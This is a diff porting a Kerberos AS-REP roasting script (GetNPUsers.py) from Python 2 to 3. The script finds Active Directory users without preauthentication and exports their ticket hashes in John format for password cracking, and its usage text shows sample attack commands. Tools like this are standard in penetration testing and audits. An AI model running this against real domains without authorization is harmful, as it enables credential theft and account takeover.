@@ -23,6 +23,8 @@
 #
 # ToDo:
 #
+from __future__ import division
+from __future__ import print_function
 import argparse
 import datetime
 import logging
@@ -54,12 +56,12 @@ class GetUserNoPreAuth:
         outputFormat = ' '.join(['{%d:%ds} ' % (num, width) for num, width in enumerate(colLen)])
 
         # Print header
-        print outputFormat.format(*header)
-        print '  '.join(['-' * itemLen for itemLen in colLen])
+        print(outputFormat.format(*header))
+        print('  '.join(['-' * itemLen for itemLen in colLen]))
 
         # And now the rows
         for row in items:
-            print outputFormat.format(*row)
+            print(outputFormat.format(*row))
 
     def __init__(self, username, password, domain, cmdLineOptions):
         self.__username = username
@@ -93,7 +95,7 @@ class GetUserNoPreAuth:
             s.login('', '')
         except Exception:
             if s.getServerName() == '':
-                raise('Error while anonymous logging into %s' % self.__domain)
+                raise Exception('Error while anonymous logging into %s')
         else:
             s.logoff()
         return s.getServerName()
@@ -154,7 +156,7 @@ class GetUserNoPreAuth:
 
         try:
             r = sendReceive(message, domain, self.__kdcHost)
-        except KerberosError, e:
+        except KerberosError as e:
             if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                 # RC4 not available, OK, let's ask for newer types
                 supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
@@ -179,13 +181,13 @@ class GetUserNoPreAuth:
 
         # Let's output the TGT enc-part/cipher in John format, in case somebody wants to use it.
         return '$krb5asrep$%d$%s@%s:%s$%s' % ( asRep['enc-part']['etype'], clientName, domain,
-                                               hexlify(asRep['enc-part']['cipher'].asOctets()[:16]),
-                                               hexlify(asRep['enc-part']['cipher'].asOctets()[16:]))
+                                               hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
+                                               hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode())
 
     @staticmethod
     def outputTGT(entry, fd=None):
         if fd is None:
-            print entry
+            print(entry)
         else:
             fd.write(entry + '\n')
 
@@ -214,7 +216,7 @@ class GetUserNoPreAuth:
             else:
                 ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                              self.__aesKey, kdcHost=self.__kdcHost)
-        except ldap.LDAPSessionError, e:
+        except ldap.LDAPSessionError as e:
             if str(e).find('strongerAuthRequired') >= 0:
                 # We need to try SSL
                 ldapConnection = ldap.LDAPConnection('ldaps://%s' % target, self.baseDN, self.__kdcHost)
@@ -242,7 +244,7 @@ class GetUserNoPreAuth:
                                          attributes=['sAMAccountName',
                                                      'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
                                          sizeLimit=999)
-        except ldap.LDAPSearchError, e:
+        except ldap.LDAPSearchError as e:
             if e.getErrorString().find('sizeLimitExceeded') >= 0:
                 logging.debug('sizeLimitExceeded exception caught, giving up and processing the data received')
                 # We reached the sizeLimit, process the answers we have already and that's it. Until we implement
@@ -266,32 +268,33 @@ class GetUserNoPreAuth:
             lastLogon = 'N/A'
             try:
                 for attribute in item['attributes']:
-                    if attribute['type'] == 'sAMAccountName':
+                    if str(attribute['type']) == 'sAMAccountName':
                         sAMAccountName = str(attribute['vals'][0])
                         mustCommit = True
-                    elif attribute['type'] == 'userAccountControl':
-                        userAccountControl = "0x%x" % attribute['vals'][0]
-                    elif attribute['type'] == 'memberOf':
+                    elif str(attribute['type']) == 'userAccountControl':
+                        userAccountControl = "0x%x" % int(attribute['vals'][0])
+                    elif str(attribute['type']) == 'memberOf':
                         memberOf = str(attribute['vals'][0])
-                    elif attribute['type'] == 'pwdLastSet':
+                    elif str(attribute['type']) == 'pwdLastSet':
                         if str(attribute['vals'][0]) == '0':
                             pwdLastSet = '<never>'
                         else:
                             pwdLastSet = str(datetime.datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
-                    elif attribute['type'] == 'lastLogon':
+                    elif str(attribute['type']) == 'lastLogon':
                         if str(attribute['vals'][0]) == '0':
                             lastLogon = '<never>'
                         else:
                             lastLogon = str(datetime.datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                 if mustCommit is True:
                     answers.append([sAMAccountName,memberOf, pwdLastSet, lastLogon, userAccountControl])
-            except Exception, e:
+            except Exception as e:
+                logging.debug("Exception:", exc_info=True)
                 logging.error('Skipping item, cannot process due to error %s' % str(e))
                 pass
 
         if len(answers)>0:
             self.printTable(answers, header=[ "Name", "MemberOf", "PasswordLastSet", "LastLogon", "UAC"])
-            print '\n\n'
+            print('\n\n')
 
             if self.__requestTGT is True:
                 # Get a TGT for the current user
@@ -303,20 +306,20 @@ class GetUserNoPreAuth:
                     try:
                         entry = self.getTGT(answer[0])
                         self.outputTGT(entry,fd)
-                    except Exception , e:
+                    except Exception as e:
                         logging.error('%s' % str(e))
                 if fd is not None:
                     fd.close()
 
         else:
-            print "No entries found!"
+            print("No entries found!")
 
 
 # Process command-line arguments.
 if __name__ == '__main__':
     # Init the example's logger theme
     logger.init()
-    print version.BANNER
+    print(version.BANNER)
 
     parser = argparse.ArgumentParser(add_help = True, description = "Queries target domain for users with "
                                   "'Do not require Kerberos preauthentication' set and export their TGTs for cracking")
@@ -344,17 +347,17 @@ if __name__ == '__main__':
 
     if len(sys.argv)==1:
         parser.print_help()
-        print "\nThere are a few modes for using this script"
-        print "\n1. Get a TGT for a user:"
-        print "\n\tGetNPUsers.py contoso.com/john.doe -no-pass"
-        print "\nFor this operation you don\'t need john.doe\'s password. It is important tho, to specify -no-pass in the script, " \
-              "\notherwise a badpwdcount entry will be added to the user"
-        print "\n2. Get a list of users with UF_DONT_REQUIRE_PREAUTH set"
-        print "\n\tGetNPUsers.py contoso.com/emily:password or GetNPUsers.py contoso.com/emily"
-        print "\nThis will list all the users in the contoso.com domain that have UF_DONT_REQUIRE_PREAUTH set. \nHowever " \
-              "it will require you to have emily\'s password. (If you don\'t specify it, it will be asked by the script)"
-        print "\n3. Request TGTs for all users"
-        print "\n\tGetNPUsers.py contoso.com/emily:password -request or GetNPUsers.py contoso.com/emily"
+        print("\nThere are a few modes for using this script")
+        print("\n1. Get a TGT for a user:")
+        print("\n\tGetNPUsers.py contoso.com/john.doe -no-pass")
+        print("\nFor this operation you don\'t need john.doe\'s password. It is important tho, to specify -no-pass in the script, " \
+              "\notherwise a badpwdcount entry will be added to the user")
+        print("\n2. Get a list of users with UF_DONT_REQUIRE_PREAUTH set")
+        print("\n\tGetNPUsers.py contoso.com/emily:password or GetNPUsers.py contoso.com/emily")
+        print("\nThis will list all the users in the contoso.com domain that have UF_DONT_REQUIRE_PREAUTH set. \nHowever " \
+              "it will require you to have emily\'s password. (If you don\'t specify it, it will be asked by the script)")
+        print("\n3. Request TGTs for all users")
+        print("\n\tGetNPUsers.py contoso.com/emily:password -request or GetNPUsers.py contoso.com/emily")
         sys.exit(1)
 
     options = parser.parse_args()
@@ -392,8 +395,6 @@ if __name__ == '__main__':
     try:
         executer = GetUserNoPreAuth(username, password, domain, options)
         executer.run()
-    except Exception, e:
-        if logging.getLogger().level == logging.DEBUG:
-            import traceback
-            traceback.print_exc()
+    except Exception as e:
+        logging.debug("Exception:", exc_info=True)
         logging.error(str(e))
